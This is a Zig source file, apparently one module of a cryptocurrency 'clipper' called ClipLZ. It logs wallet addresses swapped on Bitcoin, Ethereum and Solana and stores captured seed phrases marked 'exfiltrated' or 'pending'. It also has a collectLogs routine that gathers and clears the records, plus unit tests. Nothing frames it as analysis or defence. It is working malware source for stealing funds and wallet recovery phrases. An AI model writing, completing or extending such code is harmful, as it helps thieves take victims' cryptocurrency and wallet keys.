const std = @import("std");
const scanner = @import("scanner.zig");

const MAX_SWAPS: usize = 1024;
const MAX_SEEDS: usize = 64;

pub const SeedEntry = struct {
    timestamp: i64,
    phrase_preview: [32]u8,
    exfiltrated: bool,
};

pub const SwapEntry = struct {
    timestamp: i64,
    chain: scanner.Chain,
    original_prefix: [8]u8,
    original_suffix: [8]u8,
    format: []const u8,
};

pub const ClipperLog = struct {
    swap_entries: [MAX_SWAPS]SwapEntry = undefined,
    swap_count: usize = 0,
    seed_entries: [MAX_SEEDS]SeedEntry = undefined,
    seed_count: usize = 0,
    allocator: std.mem.Allocator,

    pub fn init(allocator: std.mem.Allocator) ClipperLog {
        return ClipperLog{ .allocator = allocator };
    }

    pub fn deinit(self: *ClipperLog) void {
        @memset(@as(*[MAX_SWAPS]SwapEntry, @ptrCast(&self.swap_entries)), undefined);
        @memset(@as(*[MAX_SEEDS]SeedEntry, @ptrCast(&self.seed_entries)), undefined);
        self.swap_count = 0;
        self.seed_count = 0;
    }

    pub fn addSwap(self: *ClipperLog, record: SwapEntry) void {
        if (self.swap_count < MAX_SWAPS) {
            self.swap_entries[self.swap_count] = record;
            self.swap_count += 1;
        } else {
            @memcpy(&self.swap_entries, self.swap_entries[1..MAX_SWAPS]);
            self.swap_entries[MAX_SWAPS - 1] = record;
        }
    }

    pub fn addSeed(self: *ClipperLog, phrase: []const u8, exfiltrated: bool) void {
        var entry = SeedEntry{
            .timestamp = getTimestamp(),
            .phrase_preview = .{0} ** 32,
            .exfiltrated = exfiltrated,
        };
        const copy_len = @min(phrase.len, entry.phrase_preview.len);
        @memcpy(entry.phrase_preview[0..copy_len], phrase[0..copy_len]);

        if (self.seed_count < MAX_SEEDS) {
            self.seed_entries[self.seed_count] = entry;
            self.seed_count += 1;
        } else {
            @memcpy(&self.seed_entries, self.seed_entries[1..MAX_SEEDS]);
            self.seed_entries[MAX_SEEDS - 1] = entry;
        }
    }

    pub fn format(self: *ClipperLog, allocator: std.mem.Allocator) ![]u8 {
        var buf = std.ArrayList(u8).init(allocator);
        try buf.appendSlice("=== ClipLZ Log ===\n");

        if (self.seed_count > 0) {
            try buf.appendSlice("--- Seed Phrases ---\n");
            for (0..self.seed_count) |i| {
                const e = &self.seed_entries[i];
                const preview_end = std.mem.indexOfScalar(u8, &e.phrase_preview, 0) orelse 32;
                try buf.appendSlice("  [Seed] ");
                try buf.appendSlice(e.phrase_preview[0..preview_end]);
                try buf.appendSlice(if (e.exfiltrated) " (exfiltrated)\n" else " (pending)\n");
            }
        }

        if (self.swap_count > 0) {
            try buf.appendSlice("--- Address Swaps ---\n");
            for (0..self.swap_count) |i| {
                const e = &self.swap_entries[i];
                try buf.appendSlice("  [Swap] ");
                try buf.appendSlice(e.chain.label());
                try buf.appendSlice(" ");
                try buf.appendSlice(e.original_prefix[0..8]);
                try buf.appendSlice("...");
                try buf.appendSlice(e.original_suffix[0..8]);
                try buf.appendSlice(" ");
                try buf.appendSlice(e.format);
                try buf.appendSlice("\n");
            }
        }

        if (self.seed_count == 0 and self.swap_count == 0) {
            try buf.appendSlice("  No clipper activity recorded.\n");
        }

        return buf.toOwnedSlice();
    }

    pub fn collectLogs(self: *ClipperLog, allocator: std.mem.Allocator) ![]u8 {
        const result = try self.format(allocator);
        self.reset();
        return result;
    }

    pub fn hasData(self: *const ClipperLog) bool {
        return self.seed_count > 0 or self.swap_count > 0;
    }

    pub fn reset(self: *ClipperLog) void {
        @memset(self.swap_entries[0..self.swap_count], undefined);
        @memset(self.seed_entries[0..self.seed_count], undefined);
        self.swap_count = 0;
        self.seed_count = 0;
    }
};

fn getTimestamp() i64 {
    return @as(i64, @intCast(std.time.milliTimestamp())) * 10000 + 116444736000000000;
}

test "init and hasData" {
    var log = ClipperLog.init(std.testing.allocator);
    defer log.deinit();
    try std.testing.expect(!log.hasData());
}

test "addSwap and hasData" {
    var log = ClipperLog.init(std.testing.allocator);
    defer log.deinit();
    log.addSwap(SwapEntry{
        .timestamp = 0,
        .chain = .bitcoin,
        .original_prefix = .{ 'b', 'c', '1', 'q', '8', '.', '.', '.' },
        .original_suffix = .{ 'h', 'a', 'l', 'y', 'j', 'l', '.', '.' },
        .format = "SegWit (bc1)",
    });
    try std.testing.expect(log.hasData());
}

test "format returns text" {
    var log = ClipperLog.init(std.testing.allocator);
    defer log.deinit();
    log.addSwap(SwapEntry{
        .timestamp = 0,
        .chain = .ethereum,
        .original_prefix = .{ '0', 'x', '2', '2', 'f', '2', '4', 'a' },
        .original_suffix = .{ 'f', '5', '8', 'd', '6', '7', '.', '.' },
        .format = "EVM (0x)",
    });
    const text = try log.format(std.testing.allocator);
    defer std.testing.allocator.free(text);
    try std.testing.expect(std.mem.indexOf(u8, text, "ETH") != null);
    try std.testing.expect(std.mem.indexOf(u8, text, "0x22f24") != null);
}

test "reset clears data" {
    var log = ClipperLog.init(std.testing.allocator);
    defer log.deinit();
    log.addSwap(SwapEntry{
        .timestamp = 0,
        .chain = .bitcoin,
        .original_prefix = .{ 'b', 'c', '1', 'q', '8', '.', '.', '.' },
        .original_suffix = .{ 'h', 'a', 'l', 'y', 'j', 'l', '.', '.' },
        .format = "SegWit",
    });
    try std.testing.expect(log.hasData());
    log.reset();
    try std.testing.expect(!log.hasData());
}

test "ring buffer eviction" {
    var log = ClipperLog.init(std.testing.allocator);
    defer log.deinit();
    for (0..MAX_SWAPS + 10) |i| {
        var prefix: [8]u8 = undefined;
        @memset(&prefix, @as(u8, @intCast('A' + @as(u8, @truncate(@mod(i, 26))))));
        log.addSwap(SwapEntry{
            .timestamp = @as(i64, @intCast(i)),
            .chain = .bitcoin,
            .original_prefix = prefix,
            .original_suffix = prefix,
            .format = "test",
        });
    }
    try std.testing.expectEqual(MAX_SWAPS, log.swap_count);
}

test "seed add and format" {
    var log = ClipperLog.init(std.testing.allocator);
    defer log.deinit();
    log.addSeed("abandon ability able about above absent absorb abstract absurd abuse access accident", true);
    try std.testing.expect(log.hasData());
    const text = try log.format(std.testing.allocator);
    defer std.testing.allocator.free(text);
    try std.testing.expect(std.mem.indexOf(u8, text, "Seed") != null);
}

test "collectLogs formats and resets" {
    var log = ClipperLog.init(std.testing.allocator);
    defer log.deinit();
    log.addSwap(SwapEntry{
        .timestamp = 0,
        .chain = .solana,
        .original_prefix = .{ '7', 'U', 'Q', 'u', 'w', 'T', 'T', 'b' },
        .original_suffix = .{ 's', 'h', 'y', 'z', 'W', '.', '.', '.' },
        .format = "Base58",
    });
    const text = try log.collectLogs(std.testing.allocator);
    defer std.testing.allocator.free(text);
    try std.testing.expect(std.mem.indexOf(u8, text, "SOL") != null);
    try std.testing.expect(!log.hasData());
}

test "deinit no crash on empty log" {
    var log = ClipperLog.init(std.testing.allocator);
    log.deinit();
}
